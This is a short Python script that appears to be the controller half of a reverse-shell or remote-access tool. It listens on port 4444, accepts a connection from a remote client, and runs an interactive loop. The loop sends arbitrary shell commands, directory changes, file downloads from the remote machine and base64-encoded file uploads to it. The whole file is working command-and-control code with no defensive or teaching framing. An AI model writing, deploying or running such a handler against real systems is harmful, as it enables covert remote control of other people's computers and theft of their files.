#!/usr/bin/env python3
import socket
import json
import base64

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444

def server():
    """Listen for client connection."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    print(f"[+] Client connected from {addr}")
    return conn

def send(conn, data):
    """Send JSON-encoded data."""
    conn.send(json.dumps(data).encode())

def receive(conn):
    """Receive and decode JSON data."""
    data = b""
    while True:
        chunk = conn.recv(1024)
        data += chunk
        if len(chunk) < 1024:
            break
    return json.loads(data.decode())

def run(conn):
    """Command loop."""
    cwd = ""
    while True:
        cmd = input(f"{cwd}> ").strip()
        
        if cmd == "exit":
            send(conn, {"command": "exit"})
            break
            
        elif cmd.startswith("cd "):
            send(conn, {"command": "cd", "path": cmd[3:]})
            
        elif cmd.startswith("download "):
            send(conn, {"command": "download", "path": cmd[9:]})
            
        elif cmd.startswith("upload "):
            path = cmd[7:]
            try:
                with open(path, "rb") as f:
                    file_data = base64.b64encode(f.read()).decode()
                send(conn, {"command": "upload", "path": path, "file_data": file_data})
            except:
                print("[-] Upload failed")
                continue
                
        else:
            send(conn, {"command": cmd})
            
        result = receive(conn)
        print(result["result"])
        if "cwd" in result:
            cwd = result["cwd"]

if __name__ == "__main__":
    conn = server()
    try:
        run(conn)
    finally:
        conn.close()